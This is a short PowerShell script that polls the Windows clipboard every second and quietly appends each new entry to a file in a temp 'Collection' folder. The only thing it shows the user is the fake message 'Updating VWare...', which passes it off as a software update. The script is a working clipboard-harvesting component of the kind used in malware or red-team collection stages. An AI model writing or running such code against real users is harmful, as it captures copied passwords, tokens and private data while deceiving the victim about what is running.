Add-Type -AssemblyName System.Windows.Forms

$outputFilePath = "$env:TEMP\Collection\ClipboardContent.txt"

Write-Host "Updating VWare..."

$previousText = ""
while ($true) {
    $currentText = [System.Windows.Forms.Clipboard]::GetText()
    if ($currentText -ne $previousText -and $currentText -ne "") {
        Add-Content -Path $outputFilePath -Value $currentText
        $previousText = $currentText
    }
    Start-Sleep -Seconds 1
}
